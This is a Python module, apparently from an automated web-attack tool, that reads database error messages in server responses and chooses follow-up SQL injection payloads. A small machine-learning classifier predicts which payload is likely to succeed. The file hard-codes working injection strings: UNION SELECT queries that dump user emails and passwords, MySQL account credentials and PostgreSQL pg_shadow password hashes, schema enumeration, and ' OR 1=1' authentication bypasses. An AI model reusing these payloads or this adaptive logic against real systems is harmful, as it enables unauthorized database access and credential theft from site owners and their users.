"""
ML-driven Payload Evolution System
Analyzes error responses and evolves payloads for deeper exploitation
"""

import re
import logging
import numpy as np
import pandas as pd
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report
import joblib
from typing import List, Dict, Any, Tuple, Optional
from pathlib import Path
import json

logger = logging.getLogger(__name__)

class PayloadEvolver:
    """ML system to evolve payloads based on error response analysis"""
    
    def __init__(self, model_path: str = "models/payload_evolver.joblib"):
        self.model_path = Path(model_path)
        self.model = None
        self.error_analyzer = None
        self.payload_generator = None
        
        # Error pattern database
        self.error_patterns = {
            "sqlite_incomplete": {
                "patterns": ["SQLITE_ERROR: incomplete input", "incomplete input", "syntax error"],
                "suggestions": ["Complete the SQL statement", "Add proper closing", "Fix syntax"],
                "payload_evolution": "sqlite_completion"
            },
            "mysql_syntax": {
                "patterns": ["mysql", "syntax error", "near", "unexpected"],
                "suggestions": ["Fix MySQL syntax", "Check quotes", "Add proper escaping"],
                "payload_evolution": "mysql_fix"
            },
            "postgresql_error": {
                "patterns": ["postgresql", "psql", "column", "relation"],
                "suggestions": ["Fix PostgreSQL syntax", "Check column names", "Verify table names"],
                "payload_evolution": "postgresql_fix"
            },
            "access_denied": {
                "patterns": ["access denied", "permission denied", "unauthorized"],
                "suggestions": ["Try different injection point", "Use different payload", "Check authentication"],
                "payload_evolution": "access_bypass"
            },
            "timeout": {
                "patterns": ["timeout", "connection reset", "time out"],
                "suggestions": ["Reduce payload complexity", "Try simpler injection", "Check network"],
                "payload_evolution": "timeout_optimization"
            }
        }
        
        # Advanced payload templates for evolution
        self.evolution_templates = {
            "sqlite_completion": [
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                "' UNION SELECT id,email,password,4,5,6,7,8,9,10 FROM Users--",
                "' UNION SELECT sqlite_version(),2,3,4,5,6,7,8,9,10--",
                "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
                "' UNION SELECT sql FROM sqlite_master WHERE type='table'--"
            ],
            "mysql_fix": [
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10#",
                "' UNION SELECT user(),version(),database(),4,5,6,7,8,9,10#",
                "' UNION SELECT table_name FROM information_schema.tables#",
                "' UNION SELECT column_name FROM information_schema.columns#",
                "' UNION SELECT CONCAT(user,':',password) FROM mysql.user#"
            ],
            "postgresql_fix": [
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                "' UNION SELECT version(),current_user,current_database(),4,5,6,7,8,9,10--",
                "' UNION SELECT tablename FROM pg_tables--",
                "' UNION SELECT column_name FROM information_schema.columns--",
                "' UNION SELECT usename,passwd FROM pg_shadow--"
            ],
            "access_bypass": [
                "' OR '1'='1' LIMIT 1--",
                "' OR 1=1 LIMIT 1 OFFSET 0--",
                "' OR 'a'='a'--",
                "' OR 1=1#",
                "' OR 'x'='x'--"
            ],
            "timeout_optimization": [
                "' OR 1=1--",
                "' OR 'a'='a'--",
                "' OR 1=1#",
                "' OR 'x'='x'--",
                "' OR 1=1 LIMIT 1--"
            ]
        }
        
        self.load_model()
    
    def load_model(self):
        """Load the trained ML model"""
        try:
            if self.model_path.exists():
                with open(self.model_path, 'rb') as f:
                    model_data = joblib.load(f)
                    self.model = model_data.get('model')
                    self.error_analyzer = model_data.get('error_analyzer')
                    self.payload_generator = model_data.get('payload_generator')
                logger.info("✅ Payload evolver model loaded successfully")
            else:
                logger.info("📝 No existing model found, will train new one")
                self.model = None
        except Exception as e:
            logger.error(f"❌ Failed to load payload evolver model: {e}")
            self.model = None
    
    def analyze_error_response(self, response_text: str, status_code: int) -> Dict[str, Any]:
        """Analyze error response to determine what went wrong"""
        response_lower = response_text.lower()
        
        analysis = {
            "error_type": "unknown",
            "confidence": 0.0,
            "suggestions": [],
            "evolution_strategy": None,
            "patterns_found": []
        }
        
        # Check for specific error patterns
        for error_type, error_info in self.error_patterns.items():
            for pattern in error_info["patterns"]:
                if pattern.lower() in response_lower:
                    analysis["patterns_found"].append(pattern)
                    analysis["error_type"] = error_type
                    analysis["confidence"] += 0.3
                    analysis["suggestions"].extend(error_info["suggestions"])
                    analysis["evolution_strategy"] = error_info["payload_evolution"]
        
        # Additional heuristics
        if status_code == 500:
            analysis["confidence"] += 0.2
            analysis["suggestions"].append("Server error suggests injection attempt")
        
        if "error" in response_lower:
            analysis["confidence"] += 0.1
        
        # Normalize confidence
        analysis["confidence"] = min(1.0, analysis["confidence"])
        
        return analysis
    
    def evolve_payload(self, original_payload: str, error_analysis: Dict[str, Any], 
                      endpoint_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate evolved payloads based on error analysis"""
        
        evolution_strategy = error_analysis.get("evolution_strategy")
        evolved_payloads = []
        
        if evolution_strategy and evolution_strategy in self.evolution_templates:
            # Get template payloads for this strategy
            template_payloads = self.evolution_templates[evolution_strategy]
            
            for i, template in enumerate(template_payloads):
                evolved_payloads.append({
                    "payload": template,
                    "base_score": 0.8 - (i * 0.1),  # Decreasing score
                    "context": f"evolved_{evolution_strategy}",
                    "evolution_reason": error_analysis.get("suggestions", [])[0] if error_analysis.get("suggestions") else "ML evolution",
                    "original_payload": original_payload,
                    "error_type": error_analysis.get("error_type", "unknown")
                })
        
        # Fallback: generate basic evolved payloads
        if not evolved_payloads:
            evolved_payloads = self._generate_fallback_evolutions(original_payload, error_analysis)
        
        return evolved_payloads
    
    def _generate_fallback_evolutions(self, original_payload: str, error_analysis: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate fallback evolved payloads when no specific strategy is available"""
        
        evolved_payloads = []
        
        # Try different variations of the original payload
        variations = [
            original_payload + " LIMIT 1--",
            original_payload.replace("'", '"'),
            original_payload.replace("--", "#"),
            original_payload.replace("'", "\\'"),
            original_payload + " UNION SELECT 1--"
        ]
        
        for i, variation in enumerate(variations):
            evolved_payloads.append({
                "payload": variation,
                "base_score": 0.7 - (i * 0.1),
                "context": "fallback_evolution",
                "evolution_reason": "Basic payload variation",
                "original_payload": original_payload,
                "error_type": error_analysis.get("error_type", "unknown")
            })
        
        return evolved_payloads
    
    def train_model(self, training_data: List[Dict[str, Any]]):
        """Train the ML model on error response data"""
        logger.info("🚀 Training payload evolver model...")
        
        # Prepare training data
        X_text = []
        X_features = []
        y = []
        
        for sample in training_data:
            # Text features (error response)
            X_text.append(sample.get("error_response", ""))
            
            # Numerical features
            features = [
                sample.get("status_code", 0),
                sample.get("response_length", 0),
                len(sample.get("original_payload", "")),
                sample.get("payload_type_score", 0.0)
            ]
            X_features.append(features)
            
            # Label (success/failure)
            y.append(1 if sample.get("success", False) else 0)
        
        if not X_text:
            logger.warning("⚠️ No training data provided")
            return
        
        # Train error analyzer (TF-IDF on error responses)
        self.error_analyzer = TfidfVectorizer(max_features=100, stop_words='english')
        X_text_features = self.error_analyzer.fit_transform(X_text)
        
        # Combine features
        X_combined = np.hstack([X_text_features.toarray(), np.array(X_features)])
        
        # Train classifier
        self.model = RandomForestClassifier(n_estimators=100, random_state=42)
        self.model.fit(X_combined, y)
        
        # Save model
        model_data = {
            'model': self.model,
            'error_analyzer': self.error_analyzer,
            'payload_generator': self.payload_generator
        }
        
        self.model_path.parent.mkdir(parents=True, exist_ok=True)
        with open(self.model_path, 'wb') as f:
            joblib.dump(model_data, f)
        
        logger.info("✅ Payload evolver model trained and saved")
    
    def predict_success_probability(self, error_response: str, status_code: int, 
                                  payload: str) -> float:
        """Predict probability of success for a given payload"""
        if self.model is None or self.error_analyzer is None:
            return 0.5  # Default probability
        
        try:
            # Prepare features
            X_text = self.error_analyzer.transform([error_response])
            X_features = np.array([[status_code, len(error_response), len(payload), 0.5]])
            X_combined = np.hstack([X_text.toarray(), X_features])
            
            # Predict
            probability = self.model.predict_proba(X_combined)[0][1]
            return float(probability)
        except Exception as e:
            logger.error(f"❌ Error predicting success probability: {e}")
            return 0.5

# Global instance
payload_evolver = PayloadEvolver()
